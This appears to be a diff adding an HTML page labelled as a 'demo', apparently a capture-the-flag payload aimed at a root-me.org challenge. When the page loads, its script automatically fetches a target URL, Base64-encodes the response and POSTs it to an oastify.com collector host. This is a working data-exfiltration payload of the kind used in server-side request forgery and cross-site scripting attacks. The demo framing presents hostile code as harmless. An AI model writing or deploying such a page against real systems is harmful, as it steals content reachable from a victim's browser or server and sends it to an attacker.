@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto GET → Base64 → POST Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        #output {
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background-color: #f9f9f9;
+            white-space: pre-wrap;
+        }
+        .status {
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Auto GET → Base64 → POST Demo</h1>
+    <div class="status" id="status">Starting process...</div>
+    <div id="output">Results will appear here automatically...</div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async function() {
+            const statusDiv = document.getElementById('status');
+            const outputDiv = document.getElementById('output');
+            
+            // Configuration - change these URLs as needed
+            const getUrl = 'http://ctf16.root-me.org/room';
+            const postUrl = 'http://z88gl45ng2u1xnfbp2qbu0gfm6sxgp4e.oastify.com';
+            
+            outputDiv.textContent = `Configuration:\nGET URL: ${getUrl}\nPOST URL: ${postUrl}\n\n`;
+            
+            try {
+                // Step 1: Make GET request
+                statusDiv.textContent = "Making GET request...";
+                outputDiv.textContent += "Step 1: Making GET request to: " + getUrl + "\n";
+                
+                const getResponse = await fetch(getUrl);
+                
+                if (!getResponse.ok) {
+                    throw new Error(`GET request failed with status ${getResponse.status}`);
+                }
+
+                // Step 2: Get response content as text
+                statusDiv.textContent = "Processing GET response...";
+                const content = await getResponse.text();
+                outputDiv.textContent += "\nStep 2: GET response received (first 200 chars):\n" + 
+                    content.substring(0, 200) + (content.length > 200 ? "..." : "") + "\n";
+                
+                // Step 3: Encode content to Base64
+                statusDiv.textContent = "Encoding to Base64...";
+                const base64Content = btoa(unescape(encodeURIComponent(content)));
+                outputDiv.textContent += "\nStep 3: Base64 encoded (first 100 chars):\n" + 
+                    base64Content.substring(0, 100) + "...\n";
+                
+                // Step 4: Prepare POST data
+                statusDiv.textContent = "Preparing POST data...";
+                const postData = {
+                    encodedContent: base64Content,
+                    originalUrl: getUrl,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Step 5: Make POST request
+                statusDiv.textContent = "Making POST request...";
+                outputDiv.textContent += "\nStep 4: Making POST request to: " + postUrl + "\n";
+                const postResponse = await fetch(postUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(postData)
+                });
+
+                if (!postResponse.ok) {
+                    throw new Error(`POST request failed with status ${postResponse.status}`);
+                }
+
+                // Step 6: Process POST response
+                statusDiv.textContent = "Processing POST response...";
+                const result = await postResponse.json();
+                outputDiv.textContent += "\nStep 5: POST response received:\n" + 
+                    JSON.stringify(result, null, 2);
+                
+                statusDiv.textContent = "Process completed successfully!";
+                
+            } catch (error) {
+                statusDiv.textContent = "Error occurred!";
+                outputDiv.textContent += "\nERROR: " + error.message;
+                console.error('Error:', error);
+            }
+        });
+    </script>
+</body>
+</html>
